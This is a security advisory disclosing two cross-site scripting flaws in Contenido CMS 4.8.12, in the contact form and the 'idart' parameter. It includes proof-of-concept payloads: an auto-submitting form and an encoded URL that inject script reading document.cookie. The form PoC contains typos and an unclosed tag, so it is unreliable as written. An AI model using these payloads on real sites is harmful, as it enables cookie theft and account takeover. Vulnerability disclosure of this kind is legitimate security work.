@@ -1,0 +1,40 @@
+Vulnerability ID: HTB22635
+Reference: http://www.htbridge.ch/advisory/xss_vulnerability_in_contenido_cms.html
+Product: Contenido CMS
+Vendor: four for business AG ( http://www.contenido.org/ ) 
+Vulnerable Version: 4.8.12 and Probably Prior Versions
+Vendor Notification: 29 September 2010 
+Vulnerability Type: XSS (Cross Site Scripting)
+Status: Not Fixed, Vendor Alerted, Awaiting Vendor Response
+Risk level: Medium 
+Credit: High-Tech Bridge SA - Ethical Hacking & Penetration Testing (http://www.htbridge.ch/) 
+
+Vulnerability Details:
+User can execute arbitrary JavaScript code within the vulnerable application.
+
+The vulnerability exists due to failure in the contact form to properly sanitize user-supplied input in many parameters. Successful exploitation of this vulnerability could result in a compromise of the application, theft of cookie-based authentication credentials, disclosure or modification of sensitive data.
+
+An attacker can use browser to exploit this vulnerability. The following PoC is available:
+
+
+<form action=http://host/path/to/contact/form.html?parentid= methos=POST name=M>
+<input type="hidden" name="send" valuye="1">
+<input type="hidden" name="Vorname" valuye='z"><script>alert(document.cookie)</script>'>
+</form>
+<script>
+document.M.Submit();
+<script>
+
+Vulnerability Details:
+User can execute arbitrary JavaScript code within the vulnerable application.
+
+The vulnerability exists due to failure in the "front_content.php" script to properly sanitize user-supplied input in "idart" variable. Successful exploitation of this vulnerability could result in a compromise of the application, theft of cookie-based authentication credentials, disclosure or modification of sensitive data.
+
+An attacker can use browser to exploit this vulnerability. The following PoC is available:
+
+
+http://host/en/front_content.php?idart=1267%27%22%3E%3Cscript%3Ealert%28document.cookie%29%3C/script%3E
+
+Solution: Upgrade to the most recent version
+
+
